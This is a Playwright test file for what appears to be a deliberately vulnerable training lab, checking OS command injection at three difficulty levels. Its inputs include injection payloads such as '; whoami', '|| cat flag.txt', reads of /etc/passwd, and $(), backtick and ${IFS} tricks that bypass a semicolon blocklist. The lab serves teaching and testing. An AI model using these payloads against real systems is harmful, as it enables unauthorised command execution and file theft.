const { test } = require("@playwright/test");
const { openLab, setLevel, expectDone, isDone, expect } = require("./helpers");

const run = async (page, host) => { await page.fill("#ci-host", host); await page.click("#ci-form button"); return page.textContent("#ci-term"); };

test.describe("OS command injection", () => {
  test.beforeEach(async ({ page }) => { await openLab(page, "command-injection"); });

  test("Low: separators, pipes and the flag", async ({ page }) => {
    await setLevel(page, "low");
    expect(await run(page, "example.com; whoami")).toContain("\nwww-data\n");
    await expectDone(page, "ci-exec");
    expect(await run(page, "x || cat flag.txt")).toContain("FLAG{");
    await expectDone(page, "ci-flag");
    expect(await run(page, "example.com; cat /etc/passwd | grep www | wc -l")).toContain("\n1\n");
  });

  test("Shell semantics: quoting, expansion and redirection", async ({ page }) => {
    await setLevel(page, "low");
    expect(await run(page, "example.com '$(whoami)'")).toContain("ping: $(whoami):");
    const noReparse = await run(page, 'x; echo $(echo "a;cat flag.txt")');
    expect(noReparse).toContain("a;cat flag.txt");
    expect(noReparse).not.toContain("FLAG{");
    const devnull = await run(page, "example.com > /dev/null; echo $HOME");
    expect(devnull).not.toContain("64 bytes");
    expect(devnull).toContain("/var/www");
    const stderr = await run(page, "nohost 2>/dev/null; id");
    expect(stderr).not.toContain("Name or service");
    expect(stderr).toContain("uid=33");
  });

  test("Medium: blocklist rejects ; but not $(), backticks, & or ${IFS}", async ({ page }) => {
    await setLevel(page, "medium");
    expect(await run(page, "example.com; id")).toContain("Invalid characters");
    expect(await isDone(page, "ci-medium")).toBe(false);
    expect(await run(page, "$(whoami)")).toContain("ping: www-data");
    await expectDone(page, "ci-medium");
    expect(await run(page, "`cat /opt/app/flag.txt`")).toContain("FLAG{");
    expect(await run(page, "example.com&cat${IFS}flag.txt")).toContain("FLAG{");
  });

  test("High: strict validation and no shell", async ({ page }) => {
    await setLevel(page, "high");
    expect(await run(page, "$(whoami)")).toContain("Invalid host");
    expect(await run(page, "example.com")).toContain("64 bytes from");
  });
});
